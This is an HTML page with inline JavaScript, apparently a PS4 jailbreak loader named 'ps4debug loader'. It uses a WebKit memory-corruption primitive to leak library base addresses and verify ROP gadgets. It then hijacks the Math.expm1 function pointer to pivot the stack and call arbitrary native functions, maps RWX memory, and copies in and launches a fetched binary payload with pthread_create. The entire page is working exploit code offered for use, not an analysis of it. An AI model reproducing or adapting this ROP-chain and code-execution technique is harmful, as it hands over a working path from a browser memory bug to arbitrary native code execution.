<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>ps4debug loader</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  :root {
    --bg: #0d0808; --bg2: #110a0a; --border: #331515;
    --text: #e0cccc; --muted: #96686a; --dim: #4d2828;
    --red: #cc2222; --red-hi: #e04040;
    --ok: #c97878; --bad: #ff3f3f; --warn: #d49a50;
  }
  html, body { margin:0; padding:0; background:var(--bg); color:var(--text);
               font:15px/1.45 "Segoe UI",system-ui,sans-serif; }
  #brand { text-align:center; padding:8px 10px; background:var(--bg2);
           border-bottom:1px solid var(--border); }
  #brand b { font-size:15px; font-weight:700; letter-spacing:.14em;
             color:var(--red-hi); }
  #wrap { padding:16px 18px; }
  #state { font-size:22px; font-weight:700; margin:0 0 8px; }
  #out { font:13px/1.5 "Courier New",monospace; white-space:pre-wrap; margin-top:6px; }
  .ok  { color:var(--ok);   }
  .bad { color:var(--bad);  }
  .warn{ color:var(--warn); }
  body.done { background:#081008; }
  body.fail { background:#150808; }
</style>
</head>
<body>
<div id="brand"><b>ps4debug loader</b></div>
<div id="wrap">
  <div id="state">starting...</div>
  <div id="out"></div>
</div>
<script type="module">
import { establishPrimitive } from "../core.js?v=10";
import { installWindowP }     from "../mem.js";
import { int64 }              from "../int64.js";
import { offsetsFor }         from "../ps4_offsets.js";

const stateEl = document.getElementById("state");
const outEl   = document.getElementById("out");
const lines   = [];
let passCount = 0, failCount = 0;

function post(tag, detail) {
  try {
    const x = new XMLHttpRequest();
    x.open("POST", "/t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("PS4-JB&tag=" + encodeURIComponent(tag) +
           "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
  } catch (e) {}
}

function mark(tag, detail) {
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  if (outEl) {
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(l => {
      l = esc(l);
      const c = /FAIL|ERROR|THREW|MISMATCH/i.test(l) ? "bad"
              : /WARN|SKIP/i.test(l)                  ? "warn"
              : /\bOK\b|PASS|RUNNING/i.test(l)        ? "ok" : "";
      return c ? `<span class="${c}">${l}</span>` : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
  }
  post(tag, detail);
}

function state(t, c) {
  if (stateEl) { stateEl.textContent = t; stateEl.className = c || ""; }
}

function check(name, ok, detail) {
  if (ok) { passCount++; mark("OK",   name + (detail ? "  " + detail : "")); }
  else     { failCount++; mark("FAIL", name + (detail ? "  " + detail : "")); }
  return ok;
}

// ── constants ──────────────────────────────────────────────────────────────
const SYS_MMAP         = 477;
const MAP_PRIVATE      = 2;
const MAP_ANON         = 0x1000;
const PROT_RWX         = 7;
const JSVALUE_UNDEF    = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
let mainMf = null, mainOrig = null, mainArmed = false;

(async function () {
  let p = null;
  try {

    // ── firmware check ─────────────────────────────────────────────────────
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("FW", key || "(not a PS4 UA)");
    if (!off) { state("no offsets for this firmware", "bad"); return; }

    const needOff = ["wk___imp_pthread_create", "wk___imp___error", "k__error",
                     "wk_expm1_builtin", "wk_JSFunction_m_function",
                     "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data",
                     "pivot_view_sp", "k_scan_stage1"].filter(k => off[k] === undefined);
    if (!check("offsets-complete", needOff.length === 0,
               "missing=[" + needOff.join(",") + "]")) return;

    // ── primitive ──────────────────────────────────────────────────────────
    state("establishing primitive...", "warn");
    await new Promise(r => setTimeout(r, 0));

    const carrier = await establishPrimitive({
      maxAttempts: 6,
      onEvent: (t, d, a) => mark(t, (a != null ? "[" + a + "] " : "") + (d || "")),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p not installed");
    p = window.p;
    mark("PRIMITIVE-OK", "");

    // ── base addresses ─────────────────────────────────────────────────────
    const cell       = p.leakval(Math.expm1);
    const jsFuncObj  = p.read8(cell.add32(0x18));
    const nativeFn   = p.read8(jsFuncObj.add32(off.wk_JSFunction_m_function));
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);

    const errorFn       = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);

    const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (!check("bases-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) return;

    // ── gadgets ────────────────────────────────────────────────────────────
    const G = {};
    const GAD = [
      ["POP_RDI_RET",      off.wk_POP_RDI_RET,                [0x5f, 0xc3]],
      ["POP_RSI_RET",      off.wk_POP_RSI_RET,                [0x5e, 0xc3]],
      ["POP_RDX_RET",      off.wk_POP_RDX_RET,                [0x5a, 0xc3]],
      ["POP_RCX_RET",      off.wk_POP_RCX_RET,                [0x59, 0xc3]],
      ["POP_R8_RET",       off.wk_POP_R8_RET,                 [null, 0x58, 0xc3]],
      ["POP_R9_RET",       off.wk_POP_R9_RET,                 [null, 0x59, 0xc3]],
      ["POP_RAX_RET",      off.wk_POP_RAX_RET,                [0x58, 0xc3]],
      ["LEAVE_RET",        off.wk_LEAVE_RET,                  [0xc9, 0xc3]],
      ["MOV_RDI_RAX_RET",  off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
      ["G0",               off.wk_MOV_RDI_RSI_30_CALL,        [0x48, 0x8b, 0x7e, 0x30]],
      ["G1",               off.wk_POP_RAX_MOV_RAX_JMP_18,     [0x58, 0x48, 0x8b, 0x07]],
      ["G2",               off.wk_PUSH_RBP_MOV_RBP_RSP_10,    [0x55, 0x48, 0x89, 0xe5]],
      ["G3",               off.wk_MOV_RDI_RAX_8_CALL_20,      [0x48, 0x8b, 0x78, 0x08]],
      ["G4",               off.wk_MOV_RDX_RAX_18_CALL_10,     [0x48, 0x8b, 0x50, off.pivot_view_sp]],
      ["G5",               off.wk_PUSH_RDX_POP_RSP_RET,       [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
      }
      if (good) { G[nm] = a; gated++; }
      else mark("GADGET-BAD", nm);
    }
    if (!check("gadgets-ok", gated === GAD.length, gated + "/" + GAD.length)) return;

    const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                       G.POP_RCX_RET, G.POP_R8_RET,  G.POP_R9_RET];

    // ── helpers ────────────────────────────────────────────────────────────
    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
         .add32(off.wk_ArrayBuffer_m_contents_m_data)
      );
    }

    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at,     v >>> 0,          true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at,     v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi  >>> 0, true);
      }
    }

    // ── callAddr setup ─────────────────────────────────────────────────────
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);

    function makeCtx() {
      const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb), pivotDv: new DataView(pb),
        stackDv: new DataView(kb), frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
      };
      keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8);
      c.S = bufAddr(sb); c.P = bufAddr(pb);
      c.K = bufAddr(kb); c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);  put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }

    function layout(c, target, args) {
      c.stackU8.fill(0);
      new Uint8Array(c.frameDv.buffer).fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET); insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEF);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }

    const M          = makeCtx();
    mainMf           = jsFuncObj.add32(off.wk_JSFunction_m_function);
    mainOrig         = p.read8(mainMf);
    const pivotObj   = {};
    keepAlive.push(pivotObj);
    const pivotCell  = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;

    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo:  M.frameDv.getUint32(0, true),
        hi:  M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }

    // verify callAddr is working
    const pidR = callAddr(
      (() => {
        // find getpid stub (syscall 20) to sanity-check
        for (let o = 0; o < off.k_scan_stage1; o += 16) {
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
          if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === 20)
            return libkernelBase.add32(o);
        }
        return null;
      })(),
      []
    );
    check("calladdr-reaches-kernel", pidR && pidR.i32 > 0, "getpid=" + (pidR && pidR.i32));

    // ── find mmap stub ─────────────────────────────────────────────────────
    let mmapStub = null;
    for (let o = 0; o < off.k_scan_stage1 && !mmapStub; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === SYS_MMAP)
        mmapStub = libkernelBase.add32(o);
    }
    if (!check("mmap-stub-found", !!mmapStub, "syscall=477")) return;
    mark("MMAP-STUB", mmapStub.toString());

    // ── pthread_create from webkit IAT ─────────────────────────────────────
    const pthreadCreate = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
    mark("PTHREAD-ADDR", "resolved=" + pthreadCreate);
    if (!check("pthread-resolved", pthreadCreate.hi >>> 0 > 0,
               "addr=" + pthreadCreate)) return;

    // ── fetch ps4debug.bin ─────────────────────────────────────────────────
    state("fetching ps4debug.bin...", "warn");
    let blob;
    try {
      const r = await fetch("../ps4debug.bin");
      if (!r.ok) { mark("FETCH-FAIL", "HTTP " + r.status); return; }
      blob = new Uint8Array(await r.arrayBuffer());
    } catch (e) {
      mark("FETCH-THREW", e && e.message || String(e));
      return;
    }
    const headOk = blob.length > 0 && blob[0] === 0xe9;
    mark("FETCH", "bytes=" + blob.length + " head=" +
         (headOk ? "e9-ok" : "NOT-e9 (0x" + (blob[0] || 0).toString(16) + ")"));
    if (!check("blob-header-ok", headOk, "")) return;

    // ── mmap rwx ──────────────────────────────────────────────────────────
    state("mapping...", "warn");
    const sz    = (blob.length + 0x3fff) & ~0x3fff;
    const mmR   = callAddr(mmapStub, [0, sz, PROT_RWX, MAP_ANON | MAP_PRIVATE, -1, 0]);
    const entry = new int64(mmR.lo, mmR.hi);
    const mapOk = mmR.i32 !== -1 && entry.hi >>> 0 > 0;
    mark("MMAP", "addr=" + entry + " sz=0x" + sz.toString(16));
    if (!check("mmap-ok", mapOk, "addr=" + entry)) return;

    // ── copy blob ─────────────────────────────────────────────────────────
    state("copying...", "warn");
    for (let o = 0; o < blob.length; o += 8) {
      let lo = 0, hi = 0;
      for (let k = 0; k < 4; k++) lo |= (blob[o + k]     || 0) << (8 * k);
      for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
      p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
    }

    // ── verify ────────────────────────────────────────────────────────────
    let bad = -1;
    for (let o = 0; o < blob.length && bad < 0; o++)
      if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
    mark("COPY", "bytes=" + blob.length +
         (bad < 0 ? " ok" : " MISMATCH@0x" + bad.toString(16)));
    if (!check("copy-ok", bad < 0, "")) return;

    // ── launch ────────────────────────────────────────────────────────────
    state("launching ps4debug...", "warn");
    const thrAb  = new ArrayBuffer(8);
    keepAlive.push(thrAb);
    new Uint8Array(thrAb).fill(0);
    const thrAddr = bufAddr(thrAb);
    const rc      = callAddr(pthreadCreate, [thrAddr, 0, entry, 0]).i32;
    const tdv     = new DataView(thrAb);
    const handle  = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
    const running = rc === 0 && handle.hi >>> 0 > 0;
    mark("LAUNCH", "pthread_create=" + rc + " handle=" + handle);
    check("PS4DEBUG-RUNNING", running, "rc=" + rc + " handle=" + handle);

    if (running) {
      state("ps4debug running ✓", "ok");
      document.body.className = "done";
    } else {
      state("launch failed", "bad");
      document.body.className = "fail";
    }

  } catch (e) {
    mark("THREW", e && e.message ? e.message : String(e));
    state("error", "bad");
    document.body.className = "fail";
  } finally {
    // always restore Math.expm1 so the page stays usable
    if (mainArmed && mainMf && mainOrig && p) {
      try {
        p.write8(mainMf, mainOrig);
        mainArmed = false;
        mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
      } catch (e2) {
        mark("DISARM-THREW", e2 && e2.message || String(e2));
      }
    }
    mark("SUMMARY", "pass=" + passCount + " fail=" + failCount);
  }
})();
</script>
</body>
</html>
